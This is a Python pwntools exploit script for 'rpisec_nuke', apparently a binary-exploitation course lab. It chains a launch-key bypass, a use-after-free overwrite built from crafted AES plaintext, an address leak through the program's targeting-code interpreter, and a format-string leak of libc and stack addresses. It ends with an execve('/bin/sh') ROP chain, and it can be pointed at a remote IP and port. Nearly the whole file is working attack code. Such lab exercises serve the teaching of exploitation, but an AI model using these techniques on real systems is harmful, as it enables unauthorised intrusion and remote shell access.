#!/usr/bin/env python2

from pwn import *
import time
import ctypes
import re
import string
from Crypto.Cipher import AES

def uncolorize(func):

    def wrapper(*args, **kwargs):
        ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
        output = func(*args, **kwargs)
        return ansi_escape.sub('', output)

    return wrapper

# == How to use ==
# python remote.py LOCAL
# python remote.py REMOTE IP=127.0.0.1 PORT=1337

settings = {

    # Path to binary
    "binary"        : "./rpisec_nuke",

    # Path to custom libc
    "libc"          : None,
}

# Exploit here
def exploit():

    # Uncolorize setup for easy parsing
    p.recv = uncolorize(p.recv)

    # Load libc
    libc = ctypes.CDLL("libc.so.6")

    # Get &wopr
    p.recvuntil("LAUNCH SESSION - ")
    wopr = int(p.recvuntil("]=", drop=True))
    log.info("WOPR : {}".format(hex(wopr)))

    # Bypass check #1
    p.sendlineafter("MENU SELECTION: ", "1")
    p.sendlineafter("INSERT LAUNCH KEY: ", "\x00" * 0x80)

    # Free chunk at #3
    p.sendlineafter("MENU SELECTION: ", "3")
    p.sendlineafter("PLEASE CONFIRM LAUNCH SESSION #:", "")
    p.sendlineafter("PRESS ENTER TO RETURN TO MENU ", "")

    # Overwrite wopr->challenge3->success_code chunk with wopr->challenge2->enc_user
    # We need to find a plaintext which encrypted results in p32(0x31337) * 8
    # This will overwrite the challenge3->success_code bypassing the check
    # for key #3
    log.info("Overwriting #3 success code through #2 ...")
    iv = flat([0x0FEEDFACF, 0xDEADC0DE, 0xBABECAFE, 0xA55B00B])
    key = "A" * 16
    enc = AES.new(key, AES.MODE_CBC, iv)
    plaintext = enc.decrypt(p32(0x31337) * 8)
    p.sendlineafter("MENU SELECTION: ", "2")
    p.sendlineafter("ENTER AES-128 CRYPTO KEY: ", enhex(key))
    p.sendlineafter("ENTER LENGTH OF DATA (16 OR 32): ", "32")
    p.sendlineafter("ENTER DATA TO ENCRYPT: ", plaintext)

    p.sendlineafter("MENU SELECTION: ", "3")
    p.sendlineafter("YOUR RESPONSE:", "")
    p.sendlineafter("PRESS ENTER TO RETURN TO MENU ", "")

    # Send key #2
    log.info("Submitting #2")
    key = "4e96e75bd2912e31f3234f6828a4a897"
    data = "KING CROWELL".ljust(16, "\x00")
    log.info("Key (previously leaked) : {}".format(key))
    p.sendlineafter("MENU SELECTION: ", "2")
    p.sendlineafter("ENTER AES-128 CRYPTO KEY: ", key)
    p.sendlineafter("ENTER LENGTH OF DATA (16 OR 32): ", "16")
    p.sendlineafter("ENTER DATA TO ENCRYPT: ", data)

    # Program nuke
    def create_payload(s, target_value):
        pad_len = 4 - (len(s) % 4)
        s += "A" * pad_len

        words = unpack_many(s, word_size=32)
        remaining = 0x7f - len(words)

        current_value = 0
        for word in words:
            current_value ^= word

        if remaining % 2 == 0:
            s += p32(current_value)
            s += p32(target) * (remaining - 1)
        else:
            s += p32(current_value ^ target) * (remaining)

        return s

    def generate_write_at_offset(s, offset):
        result = "I" * offset

        for c in s:
            result += "S{}I".format(c)

        return result

    def generate_read_at_offset(offset, size=4):
        result = "I" * offset
        result += "OI" * size
        return result

    log.info("Programming nuke ... ")
    p.sendlineafter("MENU SELECTION: ", "4")
    checksum = 0xCAC380CD ^ 0xBADC0DED ^ 0xACC3D489
    target = checksum ^ u32("\x00END")
    log.info("Target checksum : {}".format(hex(target)))

    # Leak binary base
    payload = generate_read_at_offset(132) + "R"
    code = enhex(create_payload(payload, target))
    log.info("Executing code ...")
    p.sendlineafter("ENTER CYBER NUKE TARGETING CODE AS HEX STRING:", code)
    p.sendlineafter("PRESS ENTER TO RETURN TO MENU ", "")

    # Retrieve binary base
    p.sendlineafter("MENU SELECTION: ", "CONFIRM")
    p.recvuntil("CYBER NUKE TARGETING STATUS: ")
    base = int(p.recvline(), 16)
    p.recvuntil("CYBER NUKE TARGETING STATUS: ")
    base += int(p.recvline(), 16) << 8
    p.recvuntil("CYBER NUKE TARGETING STATUS: ")
    base += int(p.recvline(), 16) << 16
    p.recvuntil("CYBER NUKE TARGETING STATUS: ")
    base += int(p.recvline(), 16) << 24
    base -= binary.symbols['detonate_nuke']
    log.info("Base : {}".format(hex(base)))

    # Re-program nuke
    format_string = "%14$p %10$p"
    printf = base + binary.plt['printf']
    log.info("Printf : {}".format(hex(printf)))
    scanf = base + binary.plt['scanf']
    log.info("Scanf : {}".format(hex(scanf)))

    payload = generate_write_at_offset(format_string, 0)
    payload += generate_write_at_offset(p32(printf), 0x84 - len(format_string))
    payload += "DOOMR"
    code = enhex(create_payload(payload, target))
    log.info("Executing code ...")
    p.sendlineafter("ENTER CYBER NUKE TARGETING CODE AS HEX STRING:", code)

    p.recvuntil("PROGRAMMING COMPLETE\n")
    [p.recvline() for i in range(len(format_string) + 4)]
    leaks = p.recvline().split()
    stdin = int(leaks[0], 16)
    stack = int(leaks[1], 16) - 0x020d98

    log.info("Stack : {}".format(hex(stack)))
    log.info("STDIN (libc) : {}".format(hex(stdin)))
    # libc = stdin - 0x1b25a0 # LOCAL
    libc = stdin - 0x1aac20 # REMOTE
    log.info("libc base : {}".format(hex(libc)))
    # execve = libc + 0x0b07e0 # LOCAL
    execve = libc + 0xb5be0 # REMOTE
    log.info("Execve : {}".format(hex(execve)))
    # binsh = libc + 0x15b9ab # LOCAL
    binsh = libc + 0x160a24 # REMOTE
    log.info("/bin/sh : {}".format(hex(binsh)))


    # Re-program nuke
    rop = p32(execve) + p32(0) + p32(binsh)
    payload = generate_write_at_offset(rop, 0)
    payload += generate_write_at_offset(p32(base + 0x2cd4), 0x84 - len(rop))
    payload += "DOOMR"
    code = enhex(create_payload(payload, target))
    log.info("Executing code ...")
    p.sendlineafter("ENTER CYBER NUKE TARGETING CODE AS HEX STRING:", code)

    # Overwrite stack
    p.interactive()



# Initial setup
if __name__  == "__main__":

    binary = ELF(settings['binary'])
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])


    if args['LOCAL']:
        p = process([binary.path], env={"LD_PRELOAD" : "./sleep_bypass.so"})

    if args['REMOTE']:
        if not all([args.IP, args.PORT]):
            log.warning("Missing IP/PORT arguments.")
            exit()

        p = remote(args.IP, int(args.PORT))

    if not p:
        log.warning("Missing LOCAL/REMOTE argument.")
        exit()

    pause()
    exploit()
